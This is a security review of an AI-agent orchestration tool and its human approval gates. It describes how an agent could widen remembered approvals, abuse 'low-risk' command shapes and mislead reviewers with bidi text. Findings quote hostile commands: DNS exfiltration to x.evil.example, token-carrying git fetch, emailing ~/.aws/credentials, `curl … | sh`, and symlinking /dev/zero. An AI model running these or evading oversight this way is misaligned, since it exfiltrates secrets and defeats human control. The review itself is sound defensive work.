# R7 security review (Opus): main at 3456e19

Scope:
- the R6 fixes and their three follow-ups (wip/fix-r6: the hold set, remember, the low allowlist, the usage-limit hold, restore, Remote Control, the raw review card, GateShaped);
- the folder browse API (wip/picker);
- the live diff API and viewer with Viewed marks (wip/diff, DESIGN 6.21);
- themes and the built-in manual;
- standing-agent restart for new instructions.

The review was read-only. I read code and ran only read-only git. No build, test, herdr or server was run.

I read these myself:
- remember, the policy matcher and the classifier (`approvals/approvals.go`, `approvals/policy.go`, `risk/risk.go`, `risk/shape.go`, `guard/parse.go`, `RememberForJob.tsx`);
- the fleet limit and its Clear route;
- restore and the snapshot scrub;
- GateShaped;
- the raw review card;
- the land request head pin;
- the check's environment and output file;
- the whole git side of the diff engine (`landing/changes.go`, `landing/git.go`, `changes/changes.go`, the Land gate in `httpd/changes.go`).

Two read-only explorer agents covered the rest:
- one read the browse API;
- one read themes, the manual and the instruction restart.

I re-read the code behind each of their findings that I kept at low or above, where it carried a claim I relied on. That covers the browse FIFO, the browse root re-resolution, the check command restore path and the CSP line. Anything else from them is marked "(agent-read)".

Counts: **0 critical, 0 high, 5 medium, 9 low, 7 info.**

The R6 gates hold. I could not get an agent past a human hold, a land token, a reserved key, or a scrubbed snapshot.

The two R6 items that were meant to be closed before a tag are mostly closed:
- **R6-S1 is closed for Bash and open for tools.** An elevated MCP call, or a Read of a secret, is remembered as the bare tool name. That rule then allows every later call to that tool, whatever its input.
- **R6-S3 is fixed.**

The new read surfaces are sound on authentication: owner session only, Host-checked, `SameSite=Strict`, and absent from the agent socket. Their weak points:
- **The diff engine.** It reads the agent's repository with too much trust in its files. An agent can fill the disk through a symlinked index, and the review surface shows Trojan Source text without a word.
- **Restore.** It still brings a project check command that crowsnest itself runs.

---

## Findings, most severe first

### R7-S1 (medium): "Allow and remember" on an elevated *tool* call remembers the tool name, so every later call to that tool is allowed, whatever its input

- **Where:**
  - `internal/approvals/approvals.go:333-334` (`rememberable`, `case KindTool`): returns `Pattern: approval.ToolName, Exact: true`.
  - `internal/approvals/policy.go:486-497` (`toolMatches`): compares only the name.
  - `internal/risk/risk.go:93`: every `mcp__*` call is elevated by a builtin rule (not a shape hit), so it counts as recognised.
  - `risk.go:264-273`: any tool whose path-like field matches `secretPath` is elevated and recognised, `Read` included.
  - `RememberForJob.tsx:57-60`: the card says "allow exactly this tool, **word for word**".
- **Weakness:** the Bash half of R6-S1 is fixed. An exact command is compared with the plain words of each simple command (`policy.go:285-312`). A raw pattern with quotes, `|`, `;` or doubled spaces never matches anything, so it fails closed. For any other tool, "exact" means the name, and the input the human saw plays no part. The unrecognised test does not help, because MCP tools and secret-path reads are "recognised" by definition.
- **Exploit:**
  1. The agent calls `mcp__github__merge_pull_request {pr: 12}`, or `mcp__fastmail__send_email {to: me}`.
  2. The human taps Allow and remember. The card says "exactly this tool, word for word".
  3. For the rest of the job, `merge_pull_request {pr: 13, repo: other}` and `send_email {to: attacker, body: <~/.aws/credentials>}` are allowed with no human.

  A second route uses `Read`:
  1. The agent asks `Read ./.env`, which is elevated because of the secret path.
  2. The human remembers it, which stores the rule `Read`.
  3. Every later `Read` of `~/.ssh/id_ed25519` or `~/.config/crowsnest/…` is allowed, because each one is elevated, at most the rule's elevated.
- **Fix:** for a non-Bash elevated call, remember the tool *and a hash of its canonical input*, and match only that. Or do not offer remember for elevated tool calls at all, and leave that to project rules written with the preview. Never offer it when the call is elevated only because of `CheckSecrets`. Correct the card's sentence.

### R7-S2 (medium): the diff snapshot copies the checkout's index with no type or size check, so an agent can fill the disk or hang the subject

- **Where:** `internal/landing/changes.go:236-253` (`WorkTree`).
  - It takes `realIndex` from `git rev-parse --git-path index`, which honours the worktree's `gitdir:` file and the repository's layout.
  - It then runs `os.Open(realIndex)` and an unbounded `io.Copy` into `os.CreateTemp("")`.
  - None of this goes through `gitCall`, so the 20 s timeout does not apply.
- **Exploit:** the agent runs `ln -sf /dev/zero "$(git rev-parse --git-path index)"`, or `mkfifo` in its place. The next reading of a watched subject then does one of two things:
  - **`/dev/zero`:** copies forever into `$TMPDIR`, until the volume is full. Every other service on the host fails, crowsnest's SQLite included.
  - **FIFO:** blocks in `open(2)` forever while holding the subject's `e.mu` (`changes.go:255`). Every later reading of that subject, Land's `Unviewed` included, waits behind it.

  A reading starts when the human opens the Review tab, the Changes card or the palette. Watched subjects are re-read on job events and on a 10 s tick. The agent needs no tool beyond its own worktree.
- **Fix:**
  - `Lstat` the index and require a regular file of at most, say, 256 MiB (git's own index for 1,500 files is small).
  - Open it with `O_NOFOLLOW|O_NONBLOCK` and copy through `io.LimitReader`.
  - Or skip the copy: build the temporary index with `git read-tree HEAD` and `add -u`. That costs more but trusts no file.

  The same review applies to everything the engine reads outside git, which today is only this.

### R7-S3 (medium): the diff viewer, the file list and the raw review cards render bidi and invisible characters without a warning, in the views a human uses to approve work

- **Where:**
  - `web/src/components/changes/FileDiff.tsx`, `DiffViewer.tsx`, `lib/syntax.ts`: highlighted text nodes, file names in the list and headers.
  - `SchedulePanel.tsx:257-286`: the raw task file in a `<pre>`, flagged only for `<…>`.
  - A grep of `web/src` and `internal/changes` finds no bidi or format-character check. The approvals path does check (`termtext.HasBidiControl`, `risk.go:360`), so the concern is known; it just did not reach these views.
- **Weakness:** this is Trojan Source. An agent commits code whose U+202E/U+2066–2069 controls make `if (isAdmin) { … }` read as a comment, or the reverse. It can also name a file with a right-to-left override, or with homoglyphs, so that it reads as a harmless path. The human ticks it Viewed and lands. With `--require-viewed-before-land`, the evidence then says every file was reviewed.

  A zero-width space or U+2028 in a task file hides a word on the raw review card, the card that R6-S7 made the source of truth.
- **Fix:**
  - Server side, mark each file whose path, old or new text contains Unicode format characters (category Cf, bidi controls, U+2028/2029) or mixed-script identifiers.
  - Show a banner on the file and on the Land card, and render those code points visibly (as `<U+202E>` chips), as GitHub does.
  - Use the same check on review cards and the role-file "Mark read".
  - Never count a flagged file as viewed for the Land gate unless the human ticks it after the banner.

### R7-S4 (medium for a foreign backup, low for your own): restore still brings live state that crowsnest acts on: the project's check command and the standing agents' instruction layers

- **Where:**
  - `internal/backup/restore.go:466-488` (`markRestored`): revokes approval rules, drops `instructions.file-seen.*` and `*remote_control`, which fixes the R6-S5 payloads.
  - It does not touch `projects.check_command` (`store/accept.go:102-124`). That is "a shell command" which crowsnest runs itself on every done and recheck.
  - It does not touch the global and project instruction layers either. Those now flow, through the new fingerprint, into an automatic restart with a "replaces the crowsnest instructions in your system prompt" notice (`orch/freshness.go:192-203`, agent-read).
- **Weakness:** this is R5-S9 again, with a new payload.
  - A crafted backup sets a project's check command to `curl … | sh`, and crowsnest runs it on the next done, with the check environment (R6-S12 drops tokens by suffix only).
  - Its layers become the orchestrator's and the leads' system prompt as soon as the human resumes, with no review. Restore pauses, and the restart waits for the resume, so the human has one moment to look, but nothing tells them to.
- **Fix:**
  - In `markRestored`, set every project's `check_command` back to automatic, or list the commands in the restore output and hold them until re-confirmed.
  - Mark the global and project layers "restored, not reviewed", and hold the instruction restart until the human opens them.
  - Say both in the CLI's restore summary.

### R7-S5 (medium): the "low" allowlist still has shapes that write, persist or exfiltrate (R6-S2 residuals)

- **Where:** `internal/risk/shape.go`.
- **Each of these is low**, read from the code:
  - **Combined short options** slip past `optionHit` (`shape.go:93-104`): it matches `-o` and `-oFILE` but not `-uo FILE`.
    - `sort -uo ~/.zshrc evil.txt` writes `~/.zshrc`.
    - `fd -Hx rm {} .` runs `rm` (clap accepts the cluster).
  - **`uniq - FILE`** writes FILE: `operands` drops `-`, so only one operand is counted (`shape.go:136`). Example: `printf 'curl x|sh\n' | uniq - ~/.zshrc`.
  - **`go env -w` is benign** (`shape.go:47`). The value is glued to its name, so `optionHit` never sees `-toolexec`.
    - `go env -w GOFLAGS=-toolexec=/tmp/x` persists into the human's own go environment file.
    - Every later `go build` or `go test` by the human, and every crowsnest acceptance check of any Go project, then runs the agent's binary.
    - `go env -w GOPROXY=https://evil` and `CC=/tmp/x` work the same way.
  - **Writes into another repository:**
    - `git commit` and `git add` are "read-only" (`shape.go:169`).
    - `git -C ~/Developer/be commit -am x` commits to another repository, on whatever branch it has checked out, `develop` included.
    - `touch` and `mkdir` likewise reach anywhere: the outside-dir check covers only the edit tools (`risk.go:255`).
  - **Network exfiltration:**
    - `ping` is benign, and `git fetch` is benign with any URL.
    - `ping -c1 $(git config --get remote.origin.url | cut -d@ -f1 | tr -cd a-z0-9).x.evil.example` sends the remote's token by DNS, and every part of it is benign.
    - With a remembered low rule `git fetch *` (the suggestion for `git fetch origin`), `git fetch https://evil.example/<token pasted literally>` is allowed **with no human**.
- **Fix:**
  - Expand clustered short options before `optionHit`, and treat a lone `-` operand as an operand for `uniq`.
  - Allow `go env` only without `-w` or `-u`.
  - Make `git -C`, `--git-dir` and `--work-tree` outside the job root not low, and the same for `touch` and `mkdir` with a path outside it.
  - Make `git fetch` and `pull` low only with no URL argument (a configured remote name), and drop `ping` from the list.
  - Add each example above as a row.

### R7-S6 (low): GateShaped is a word list, and it misses homoglyphs, zero-width splits and inflections (R6-S9 partly)

- **Where:** `internal/questions/gate.go:65-78`.
  - Words are split on anything that is not a letter, then lowercased and looked up exactly.
  - The web's `isGate` mirrors this (per the fix report).
- **Exploit:** each of these labels reaches a lock screen as a one-tap button that reads as a grant:
  - `Аllow: merge j_5`, where the first letter is Cyrillic А;
  - `Al‍low` (ZWJ splits it into "al" and "low");
  - `Merging j_5`, `Deploys now`, `Ship it`, `Go ahead`.

  Crowsnest still acts on nothing, which I re-verified (reserved prefixes, `gate.go:129-139`). The harm is the R6-S9 one: a human who believes they granted something, and an agent that acts on the "yes" with its own tools.
- **Fix:**
  - Normalise with NFKC, strip category Cf, fold confusables (a UTS #39 skeleton), and match by stem (`allow*`, `approv*`, `merg*`, `deploy*`, `push*`, `land*`, `delet*`, `grant*`).
  - Better: put crowsnest's own words on agent-question buttons ("Option 1", "Option 2") and keep the agent's labels in the body, which the notification shows as quoted text.

### R7-S7 (low): diff engine bounds and pathspecs

- **Output is buffered whole before it is cut.**
  - `gitCall.run` collects stdout in an unbounded `bytes.Buffer` (`changes.go:121-128`), and `trimPatch` cuts at 512 KB only afterwards (`:506-519`).
  - A committed multi-gigabyte text file, with the client's `-U` allowed up to 100,000 (`:456-470`), puts gigabytes in serve's memory within the 20 s timeout.
  - Fix: read through a capped writer that kills git at the limit.
- **Pathspec magic.**
  - `Patch` passes the listed path after `--` (`:479`). Without `--literal-pathspecs` or `GIT_LITERAL_PATHSPECS=1`, git still applies globbing and `:(…)` magic.
  - A file named `*.go`, `[a]pp.go` or `:(glob)**` shows other files' diffs under its own card, and its Viewed mark covers only its own hash.
  - Fix: set `GIT_LITERAL_PATHSPECS=1` in `gitEnv`, and in landing's `git.go` too.

### R7-S8 (low): the diff root widens to the enclosing repository, and readings write objects into it

- **Where:** `internal/changes/changes.go:291-297`. `readCheckout` replaces `target.Root` with `git rev-parse --show-toplevel` and never checks that the top is the job's or project's directory.
- **Weakness:** a directory job inside a larger repository is read as that whole repository. So is a worktree whose `.git` file the agent deleted. If `$HOME` is a dotfiles repository, that means the whole home folder.
  - Untracked files up to 2 MB and 1,000 entries, `.aws`, `.ssh` and `.netrc` included unless ignored, are hashed and served to the viewer.
  - Each reading's `git add` writes loose blobs into that repository's object store, every 4 s while the subject is watched, and nothing collects them.

  Only the owner sees the result, which keeps this low, but it is outside the confinement the report claims.
- **Fix:** refuse, or show "not this job's repository", when the top is not the target root or inside it.

### R7-S9 (low): with "require all files viewed" on, the Land gate fails open and can use a reading older than the head being landed

- **Where:** `internal/httpd/changes.go:217-229`.
  - `if err != nil || unviewed == 0 { return false }`: any error from the diff service lets Land through. R7-S2's hang and R7-S7's timeout are two ways an agent can produce one.
  - `Unviewed` uses the cached reading (up to 4 s old, `changes.go:263-269, 883`), not one taken at `expected_head`.
- **Exploit:** the agent commits a new file just as the human, who has viewed everything, taps Land.
  - If the UI already shows the new head, Land pins it.
  - `Unviewed` then counts against the previous reading, which shows 0 unviewed, and the new file lands unviewed.
- **Fix:** with the setting on, refuse on error (`409 UNVIEWED_UNKNOWN`). Take a forced reading and require its head to equal `expected_head` before counting.

### R7-S10 (low): browse metadata reads block on a FIFO and follow links out of the roots

(Confirmed by reading `internal/browse/fs.go:50-63` and `browse.go:277-299`.)

- **The FIFO hang.**
  - `OS.ReadFile` opens the file before checking that it is a regular file, so a FIFO blocks in `open(2)`.
  - The agent runs `mkfifo .git/HEAD` in its worktree, and the owner's picker asks for that folder's facts.
  - The goroutine keeps its slot after the 3 s timeout, so four such folders take every slot, and all three routes then answer 503 until restart.
  - `claudeTrust` (`cmd/crowsnest/browse_wiring.go:110-123`, agent-read) can block the same way on `~/.claude.json` while holding its mutex.
- **Metadata files follow links (agent-read):**
  - `HEAD`, `config` and `packed-refs` are opened by path after only the git directory is checked (`facts.go:130-185`).
  - A `.git/HEAD -> ~/anything` whose first line starts with `ref: ` returns that line as `branch`.
- **Fix:** use one helper for every metadata read: `O_RDONLY|O_NONBLOCK|O_NOFOLLOW`, then `Fstat`, regular files only, with a cap. Require the resolved file to be inside a root, and cap `branch` at one line.

### R7-S11 (low): browse roots are re-resolved on every call, so a link swapped in later widens them

(Confirmed by reading `internal/browse/browse.go:157-168` and `jobs/protocol.go:245-256`.)

- **Where:** remembered directories are stored resolved, precisely so that "a link swapped in later cannot widen it" (R3-M2). Browse resolves them again on every call, and refuses only exactly `/`.
- **Exploit:**
  1. A job ran in `~/Work/p`, so that directory is remembered.
  2. The agent runs `rm -rf ~/Work/p && ln -s /etc ~/Work/p`.
  3. `/etc` (or `/Users`, `/Volumes`) is now a root, and its names, mtimes and git facts are listed.

  A directory above home that the human once approved becomes a root too, because `safeRoot` is not applied. The agent cannot call the routes itself, so only the owner sees more, and an agent cannot add a remembered directory by itself (agent-read: `job_create` waits for approval, and `job_adopt` takes no directory).
- **Fix:** use the stored resolved form. Refuse a place whose path no longer resolves to it, and apply `safeRoot`'s rules (not `/`, not an ancestor of home).

### R7-S12 (low): browse disclosure details

(agent-read; I checked `list.go:157-175` for the first point.)

- **Link targets leak.** An entry that links outside the roots still carries its absolute `target` and the target's directory flag (`list.go:159-163`). This reveals outside paths and whether they exist. Blank both when the entry is `Outside`.
- **An error-code oracle.** `ENOTDIR` (as in `/etc/passwd/x`) gives a 500, where a missing outside path gives a 403 (`browse.go:252`, `httpd/browse.go:154`). That is an oracle for whether an outside path is a file. Map it the same way as a missing path.
- **Huge directories.** `os.ReadDir` reads and sorts every name before the 500 cap applies (`fs.go:38`). Read in batches with `ReadDir(n)`.
- **`cleanRemote` gaps.** It keeps `?token=` queries and fragments, and the scp-like `user:tok@host:path` form (`facts.go:227`). Clear `RawQuery` and `Fragment`, and strip userinfo from scp-like forms.
- **Home is a root by default.** Every name under `~` is listed, `.ssh` and `.aws` included, and so are file names with `files=1`. Contents are never served. This is by design, but DESIGN 4.23 should say it.

### R7-S13 (low): the instruction restart can type `/exit` into the human's draft

(agent-read; `internal/orch/freshness.go:130-157`, `fleet/screen.go:288-291`, `orch/upkeep.go:157-178`.)

- **No input box counts as no draft.** `DetectDraft` returns an empty draft when it finds no input box, and `checkInstructions` tests only `draft.Present`, not `InputFound`. So a screen crowsnest does not recognise counts as "no draft".
- **A gap between reading and typing.** The screen is read, then `/exit` is typed later. A human who starts typing in between gets `/exit` appended to their text, and Enter submits it.
- **The 10-minute gap is in memory only,** so a crowsnest restart resets it.
- **The notice is read at hook time.** It is the state directory's `CROWSNEST.md`, read and deleted when the SessionStart hook fires, and never compared with the hash that was fingerprinted. That is a same-uid boundary, so this item is info.
- **Who can trigger or block a restart:**
  - Only the human's session writes layers, so an agent can trigger a restart only by a same-uid write to the database or state directory.
  - Role files do not feed standing agents, so no unread role file is applied by an automatic restart.
  - An agent can block restarts by leaving a dialog or draft on its *own* pane, not another agent's.
- **Fix:** require `InputFound`, and read the screen again right before typing. Hold the notice text in kv with its hash, not in the file.

### R7-S14 (low): the CSP has no `base-uri`, `form-action` or `object-src`

- **Where:** `internal/httpd/middleware.go:23-26`, checked. Those three do not fall back to `default-src`.
- **Weakness:** nothing injects HTML today:
  - the manual and every Markdown view use `skipHtml` with no `rehype-raw`;
  - a stored theme id is checked against `^[a-z0-9][a-z0-9-]{0,39}$` before it reaches `spa.go`'s attribute;
  - the no-flash script is a file (`/theme-init.js`), so `script-src 'self'` holds with no `unsafe-inline` (agent-read).

  So this is defence in depth only.
- **Fix:** append `base-uri 'self'; form-action 'self'; object-src 'none'`.

### Info

- **R7-I1:** a remembered exact Bash command runs whatever the repository's script or Makefile says at the time. An agent can change `scripts/release.sh` after the human remembers `./scripts/release.sh`. This is the "low runs the agent's own code" class. The card should say "this command, whatever the files it runs say then".
- **R7-I2:** exact Bash matching compares the plain words, so re-quotings that join to the same text also match (`foo a b` matches `foo "a b"`). I found no harmful case. Matching the raw text exactly, or the argv, would be stricter.
- **R7-I3:** fleet limits need two jobs. One agent that borrows a second job's token, which is documented as possible at the same uid (`agentid.go:8-17`), can still hold its engine for 24 h. The human now has Clear hold, which is session-only (`httpd/accept.go:47`).
- **R7-I4:** `checkEnv` drops credentials by suffix. It keeps `SSH_AUTH_SOCK`, `DATABASE_URL` and `*_KEY` names without `_API_`, so the check (code the branch controls) can use the human's ssh agent. The job agent already has the same, so this is info.
- **R7-I5:** a bad theme value in a restored kv fails `loadAppearance` at start-up, which is availability only (agent-read).
- **R7-I6:** `AutoCheckCommand` `Lstat`s and then reads by path (`accept.go:179`). An agent can swap in a FIFO between the two. git cannot commit a FIFO, so the swap is a live race only.
- **R7-I7:** the manual is embedded at build time. Its `app:` links only navigate or open a sheet. Search reduces queries to letter and number terms, so no ReDoS, and renders text nodes. Nothing in it comes from a repository or an agent (agent-read). Sound.

---

## Verdicts on R6

| ID | Verdict | Evidence |
|---|---|---|
| S1 remember widens elevated | **Partly** | Bash fixed. Exact only (`approvals.go:315-332`), glob characters refused, unrecognised refused (`:319`), a wider pattern refused (`:518`). Matching on plain words fails closed for quoted or compound raw patterns (`policy.go:285-336`). An env prefix, `$(`, eval or a redirect never matches. A compound needs every part to match an elevated rule, and low rules are not usable at elevated (`policy.go:250`). **Tools not fixed:** R7-S1. |
| S2 low allowlist holes | **Partly** | Every listed example is closed: `>` ends a word (`parse.go:261-266`), env safe list (`shape.go:63-80`), export and declare, option lists for fd, rg, sort, tree, uniq and git (`shape.go:84-92, 174`). New holes: R7-S5. |
| S3 usage-limit hold | **Fixed** | One report holds only its job; the fleet needs two reporters (`fleetlimit.go:157-162`). Reset capped at 24 h (`limitMax`, `:36`). Human Clear is session-auth (`httpd/accept.go:47`, `fleetlimit.go:166`). Reporters reset after the reset passes (`:144-151`). Residual R7-I3. |
| S4 acceptance evidence | **Fixed as designed** | Dirty tree refused at start, voided at the end, `definition_changed` shown, and only the newest durable check counts (per the report; I read `accept.go:362-391, 583`). `AutoCheckCommand` reads regular files of 1 MiB at most (`accept.go:179-180`). Change-and-restore between the two looks remains, and is documented. |
| S5 restore payloads | **Partly** | Rules revoked, seen-marks and `*remote_control` dropped (`restore.go:480-488`), the old database scrubbed (per the report). Check command and instruction layers: R7-S4. Nothing re-enables a revoked rule: there is no un-revoke route, and the store comment says so (`store/approval_rules.go:92`). |
| S6 scrub misses Remote Control | **Fixed** | `key LIKE '%remote_control'` and the scrub mark with re-scrub of older copies (`store/snapshot.go:48-60`). |
| S7 hidden HTML on review cards | **Fixed** | Raw `<pre>` by default, an HTML or comment warning, and the linked-file caveat (`SchedulePanel.tsx:257-293`). Invisible and bidi characters: R7-S3. |
| S8 endless check re-runs | **Fixed** | `maxCheckReruns = 3`, then the check hold (`accept.go:416`). |
| S9 GateShaped labels | **Partly** | Keys, labels and title are read (`gate.go:84-108`). Bypasses: R7-S6. |
| S10 Remote Control link from pane text | **Fixed** (read the guard) | Transcript first; a pane URL only on or just after the banner (`remote_url.go:41-51`). |
| S11 head pin, adopt origin | **Fixed** | Refused on an unreadable head (`landrequest.go:69-70`); origin set (`adopt.go:49-51`). |
| S12 check env and output | **Fixed except setsid** | Suffix denylist (`accept.go:485-497`, residual R7-I4); `O_EXCL|O_NOFOLLOW` (`:553`); the setsid escape is documented. |
| I1 reserved keys exact list | **Fixed** | Prefix rule (`gate.go:129-139`). |
| I2 cut-summary suffix test | **Fixed** | `approvals.SummaryCut` (`push/watcher.go:193`). |
| I3 agent reads its land token | Unchanged, harmless | |
| I4 edit rules and symlinks | **Fixed** (per the report, test named) | Real-path comparison and `..` refused. I did not re-read `insideRule`'s new body. |
| I5, I6 | Sound, unchanged | |

## Checked and found sound

- **The diff engine's git switches** (`landing/git.go:96-117`, `changes.go:106-158`):
  - `core.hooksPath=/dev/null`, `core.fsmonitor=false`, `diff.external=`, `--no-ext-diff --no-textconv` on diff, log and show, `protocol.ext.allow=never`, `core.pager=cat`;
  - every configured filter's `clean`, `smudge` and `process` emptied and `required=false`, on every snapshot call, `write-tree` included;
  - command-line `-c` outranks `include.path` and `includeIf` in `.git/config`;
  - `GIT_DIR`, `GIT_WORK_TREE` and `GIT_INDEX_FILE` are stripped from serve's environment.

  The engine does no network operation, so `core.sshCommand` and credential helpers do not arise.

  On the report's open question: landing's own `git status` (Inspect, Snap) uses `protectedArgs` but not `filtersOff`. So a clean filter can still run on a stat-dirty file there, and on Land. This is the documented R5-S5 residual. Applying `filtersOff` there too is cheap.
- **Refs and paths:**
  - a base ref matches `ValidRef` (no leading `-`, no `..`, no whitespace, `changes.go:88-96`), and resolution uses `--end-of-options`;
  - blob ids must be full hex ids;
  - Patch paths come only from the comparison's own listing, after `--` (but see R7-S7 on magic).
- **Viewed marks:**
  - the hash covers both blobs, both paths and the modes;
  - a stale hash is refused with 409, and any change of content or base un-views the file;
  - marks are retired with the job.

  An agent cannot make a file "look viewed" except by leaving it unchanged.
- **Diff and browse routes:**
  - session only, `checkHost` on every method, `SameSite=Strict`, CSRF on writes;
  - not on the agent socket;
  - the read token reaches only `/summary` (agent-read for browse; diff checked in `httpd/changes_test.go` names and routes).
- **Browse path confinement** (agent-read, spot-checked):
  - `within` uses a separator boundary;
  - the check is made on the resolved path;
  - case and normalisation differences fail closed;
  - "not found" appears only under an in-root ancestor;
  - a worktree's `gitdir:` outside the roots is not followed;
  - git facts never run git.
- **Themes:**
  - an id only ever reaches `data-theme`;
  - it is allowlisted against the bundled list on the client and by regex on the server;
  - no inline script (agent-read; `middleware.go:23-26` checked).
- **Standing-agent notices** are delivered by the caller's pane, from its token. One agent's notice cannot reach another (agent-read).

## Not reviewed

- **No live checks:**
  - git's behaviour with an emptied `filter.*.clean` (taken from the builder's test);
  - `/dev/zero` or a FIFO as an index;
  - clap's option clusters for `fd`;
  - pathspec magic through `--`.
- **Not read in the diff code:**
  - the web viewer's gap expansion and its `from` validation;
  - the demo-touch route (demo only).
- **Not read beyond the fix report:** the hold set's 81-cell table and its code (only the cells quoted in the R6 verdicts).
- R3-L2 and L3, still.

## Overall judgement

On a tailnet with a password, main is safe to run today: the network side is unchanged and sound, the new browse and diff routes are owner-only, and I found no way around a human gate. In the devbox behind a tunnel it is acceptable on R5's conditions (Cloudflare Access in front, `--tailscale-auth` off), with one addition: do not open the diff view of a job you distrust until R7-S2 is fixed, because an agent can fill that box's disk. Before the next release tag:
- fix R7-S1 (no tool-name rules from a remembered elevated call);
- fix R7-S2 (a bounded, regular-file-only index copy);
- fix R7-S4 (reset check commands on restore).

R7-S3 (flag bidi and invisible characters in the diff and on review cards) and the concrete R7-S5 rows should follow in the same release.
